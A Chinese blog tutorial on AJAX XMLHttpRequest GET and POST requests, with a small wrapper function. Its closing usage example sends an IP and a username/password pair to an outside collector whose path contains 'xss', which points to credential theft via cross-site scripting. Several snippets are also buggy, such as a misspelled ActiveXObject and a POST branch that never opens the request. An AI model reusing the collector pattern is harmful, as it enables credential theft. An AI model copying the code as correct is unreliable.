+++
date = "2016-10-25T11:16:52+08:00"
description = ""
draft = false
tags = ["ajax"]
title = "AJAX之XHR请求与响应"
topics = ["JavaScript"]

+++

### 0x00 GET请求
> ```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>test</title>
    <script type="text/javascript">
        function loadXMLDoc() {
            var xmlhttp;
            if (window.XMLHttpRequest) { //创建对象
                xmlhttp = new XMLHttpRequest();
            } else {
                xmlhttp = new ActiveXObjece("Microsoft.XMLHTTP");
            }
        
            // readyState改变时，就会触发onreadystatechange事件
            // readyState存有XMLHttpRequest的状态，为0-4，4表示请求已完成，且响应已就绪
            // status为200代表ok，为404代表未找到页面
            xmlhttp.onreadystatechange=function() {
                if (xmlhttp.readyState==4 && xmlhttp.status==200) {
                    // xmlhttp.responseText获取来自服务器的响应
                    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
                }
            }

            xmlhttp.open("GET","2.html?t="+Math.random(),true); //GET请求，改变readyState
            // xmlhttp.open("GET","2.html?name=test&age=23",true); //GET发送信息
            xmlhttp.send();
        }
    </script>
</head>
<body>
    <h2>AJAX</h2>
    <button type="button" onclick="loadXMLDoc()">Request data</button>
    <div id="myDiv"></div>
</body>
</html>
```
点击"Request data"时就会请求服务端的2.html

### 0x01 POST请求
> ```
// 简单的POST请求
xmlhttp.open("POST","demo_post.html",true);
xmlhttp.send();

// POST数据
xmlhttp.open("POST","ajax_test.html",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("fname=Henry&lname=Ford");
```

### 0x02 简单封装
> ```
function createXHR () {
    var request = false;
    if (window.XMLHttpRequest) {
        request = new XMLHttpRequest();
        if (request.overrideMimeType) {
            request.overrideMimeType('text/xml');
        }
    } else if (window.ActiveXObject) {
        var versions = [
            'Microsoft.XMLHTTP', 'MSXML.XMLHTTP',
            'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0',
            'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0',
            'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
        for (var i = 0; i < versions.length; i++) {
            try {
                request = new ActiveXObject(versions);
            } catch (e) {}
        }
    }
    return request;
}

xhr=createXHR();//创建对象

function xhr_act(method,src,data){//封装POST和GET请求
    if(method=="GET"){
        xhr.open(method,src,false);           
        xhr.send();
        return xhr.responseText;
    } else if(method == "POST"){ 
        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        xhr.setRequestHeader("Content-length", data.length);
        xhr.setRequestHeader("Connection", "close");
        xhr.send(data);
        return xhr.responseText;
    }
}
```
简单使用：
> ```
//GET的使用
var src="http://114.115.214.203/wyb/xss/i.php";
xhr_act("GET",src+"?ip="+ip,false);

//POST的使用
var user = "xiaoming";
var pass = "123456";
var src="http://114.115.214.203/wyb/xss/i.php";  //传送的地方 但是需要解决跨域问题
data="username="+user+"&password="+pass;
xhr_act("POST",src,data);
```